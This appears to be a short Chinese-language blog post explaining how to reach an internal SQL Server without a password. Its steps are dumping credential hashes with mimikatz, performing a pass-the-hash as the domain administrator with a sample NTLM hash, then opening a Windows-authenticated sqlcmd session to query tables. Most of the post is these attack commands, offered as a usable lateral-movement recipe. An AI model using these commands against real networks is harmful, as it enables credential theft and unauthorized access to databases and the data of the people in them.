---
layout:     post   				    # 使用的布局（不需要改）
title:     内网sqlserver无需密码链接 				# 标题 
subtitle:   内网sqlserver无需密码链接
date:       2025-05-07 				# 时间
author:     appleszk 						# 作者
header-img: img/【哲风壁纸】动漫-动漫美女.png 	#这篇文章标题背景图片
catalog: true 						# 是否归档
tags:								#标签
    - mimikatz
    - sqlserver
    - hash传递
---
# 内网sqlserver无需密码链接

情况介绍:当你在内网获取了hash，但是想要链接sqlserver不知道密码时候，sqlserver有一个windows身份验证的功能，此时可以使用这个步骤

## 如何使用

### 使用mimikatz获取hash

```
privilege::debug
sekurlsa::logonpasswords
```

### hash传递攻击

```
privilege::debug  //首先要提权，先前提过而不需要再提权
sekurlsa::pth /user:administrator /domain:gon /ntlm:ad5a870327cddcb947af6a94a4c23
```

当此命令正确输入后就会弹出一个cmd
在命令提示符下，你可以使用 sqlcmd 工具，这是 Microsoft SQL Server 自带的命令行工具。

```
sqlcmd -S your_server_name -d your_database_name -E
```

```
SELECT * FROM your_table_name;
```
